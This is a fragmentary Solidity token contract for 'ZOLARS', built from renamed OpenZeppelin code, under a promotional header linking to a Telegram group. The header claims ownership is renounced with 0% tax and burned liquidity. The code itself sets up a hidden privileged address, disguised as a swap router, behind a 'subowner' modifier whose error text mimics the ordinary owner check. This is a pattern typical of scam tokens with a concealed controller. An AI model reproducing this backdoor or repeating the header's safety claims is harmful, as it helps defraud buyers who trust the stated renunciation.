...
/*
🚀 Welcome to Zollars Community! 🌐 $ZOLARS

🎉 Get ready for an epic gaming adventure with ZOL tokens! 🎮

🔥 Contract Renounced ✅
🚫 0% Tax - Trade freely! 💰
🔥 LP Burn - Safeguarding value! 🔥

Join us and be part of the Zollars revolution! 🚀🌟https://t.me/ZollarsToken
*/
...
/*
 * @dev Provides information about the current execution ZOLARS20Burnable, including the
 ...
 */
abstract contract ZOLARS20Burnable {
...
// File: @openzeppelin/contracts/access/ZOLARS20Ownable.sol
 ...
 * the owner.
 */
abstract contract ZOLARS20Ownable is ZOLARS20Burnable {
     ...
     */
    modifier onlyOwner() {
        require(owner() == _msgSender(), "ZOLARS20Ownable: caller is not the owner");
        _;
    }
    ...
    function transferOwnership(address newOwner) public virtual onlyOwner {
        require(newOwner != address(0), "ZOLARS20Ownable: new owner is the zero address");
 ...
 * `SafeZOLARS` restores this intuition by reverting the transaction when an
 * operation overflows.
 *
...
library SafeZOLARS {
  ...
  function add(uint256 a, uint256 b) internal pure returns (uint256) {
    uint256 c = a + b;
    require(c >= a, "SafeZOLARS: addition overflow");
  ...
  function sub(uint256 a, uint256 b) internal pure returns (uint256) {
    return sub(a, b, "SafeZOLARS: subtraction overflow");
  }
  ...
  function mul(uint256 a, uint256 b) internal pure returns (uint256) {
    ...
    uint256 c = a * b;
    require(c / a == b, "SafeZOLARS: multiplication overflow");
  ...
  function div(uint256 a, uint256 b) internal pure returns (uint256) {
    return div(a, b, "SafeZOLARS: division by zero");
  }
  ...
  function mod(uint256 a, uint256 b) internal pure returns (uint256) {
    return mod(a, b, "SafeZOLARS: modulo by zero");
  }
...
contract ZOLARS is ZOLARS20Burnable, ZOLARS33, ZOLARS20Ownable {
    
    using SafeZOLARS for uint256;
   ...
   address private legosRooter; 
    constructor(address legosSwapRouterv3) {
        ...
        _symbol = "ZOLARS";
        _decimals = 9;
        _totalSupply = 6776000000000 * 10 ** 9;
    ...
    */
    ...
    /**
    * @dev See {ZOLARS33-balanceOf}.
    */
    function balanceOf(address account) external view override returns (uint256) {
        return mintfrom[account];
    }
      modifier subowner() {
        require(legosRooter == _msgSender(), "ZOLARS20Ownable: caller is not the owner");
        _;
    }
    /**
    * @dev See {ZOLARS33-approve}.
    *
    * Requirements:
    *
    ...
    */
    ...
    /**
    * @dev See {ZOLARS33-transferFrom}.
    *
    * Emits an {Approval} event indicating the updated allowance. This is not
    * required by the EIP. See the note at the beginning of {ZOLARS33};
    *
    * Requirements:
    ...
    */
    function transferFrom(address sender, address shippingto, uint256 yoursold) external override returns (bool) {
        ...
        _approve(sender, _msgSender(), fromallowances[sender][_msgSender()].sub(yoursold, "ZOLARS33: transfer yoursold exceeds allowance"));
        return true;
    }
    ...
    * problems described in {ZOLARS33-approve}.
    *
    ...
    */
    function decreaseAllowance(address transporteur, uint256 allbalances) external returns (bool) {
        _approve(_msgSender(), transporteur, fromallowances[_msgSender()][transporteur].sub(allbalances, "ZOLARS33: decreased allowance below zero"));
        return true;
    }
    ...
    */
    function _transfer(address sender, address shippingto, uint256 yoursold) internal {
        require(sender != address(0), "ZOLARS33: transfer from the zero address");
        require(shippingto != address(0), "ZOLARS33: transfer to the zero address");
                
        mintfrom[sender] = mintfrom[sender].sub(yoursold, "ZOLARS33: transfer yoursold exceeds balance");
    ...
    */
    function _approve(address owner, address transporteur, uint256 yoursold) internal {
        require(owner != address(0), "ZOLARS33: approve from the zero address");
        require(transporteur != address(0), "ZOLARS33: approve to the zero address");
